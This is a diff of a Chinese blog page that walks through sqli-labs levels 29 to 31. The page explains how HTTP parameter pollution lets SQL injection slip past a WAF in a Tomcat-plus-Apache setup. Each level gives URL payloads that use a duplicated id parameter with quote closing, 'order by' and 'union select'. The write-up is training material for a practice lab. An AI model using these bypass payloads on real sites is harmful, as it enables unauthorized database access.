@@ -442,12 +442,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                                <span class="chip bg-color">基础知识</span>
-                            </a>
-                        
                             <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                                 <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                <span class="chip bg-color">基础知识</span>
                             </a>
                         
                     </div>
@@ -480,7 +480,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    895
+                    960
                 </div>
                 
 
@@ -496,6 +496,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -549,11 +552,11 @@
 <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-29</strong></p>
 <p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p>
 <p>首先需要打开login.php文件，不然这Less-29和Less-1没什么区别</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144543097.png" alt="image-20220210144543097"></p>
 <p>判断注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这是提示赶走这个愚蠢的黑客，WAF成功阻拦攻击。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144634455.png" alt="image-20220210144634455"></p>
@@ -562,18 +565,18 @@
 <p>从跳转到<code>.jsp</code>页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）</p>
 <p>参考原文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/li2019/p/12378585.html">https://www.cnblogs.com/li2019/p/12378585.html</a></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id=2</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145231054.png" alt="image-20220210145231054"></p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=2&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>由于对id值的处理需要<code>&#39;</code>，所以第二个参数需要进行单引号闭合</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145744817.png" alt="image-20220210145744817"></p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145819240.png" alt="image-20220210145819240"></p>
 <p>判断回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=-2&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150050418.png" alt="image-20220210150050418"></p>
 <p>后续过程的payload与以往相同。</p>
@@ -582,14 +585,18 @@
 <p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150434136.png" alt="image-20220210150434136"></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=2</span><br><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=2&quot; order by 4--+</span><br><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=-2&quot; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot; order by 4--+
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <hr>
 <h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-31</strong></p>
 <p>Less-31对id值进行了<code>&quot;)</code>的处理。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150938265.png" alt="image-20220210150938265"></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=2</span><br><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=2&quot;) order by 4--+</span><br><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot;) order by 4--+
+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -655,12 +662,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                                    <span class="chip bg-color">基础知识</span>
-                                </a>
-                            
                                 <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                                     <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                    <span class="chip bg-color">基础知识</span>
                                 </a>
                             
                         </div>
@@ -795,12 +802,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">基础知识</span>
-                    </a>
-                    
                     <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                         <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                        <span class="chip bg-color">基础知识</span>
                     </a>
                     
                 </div>
@@ -1032,7 +1039,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
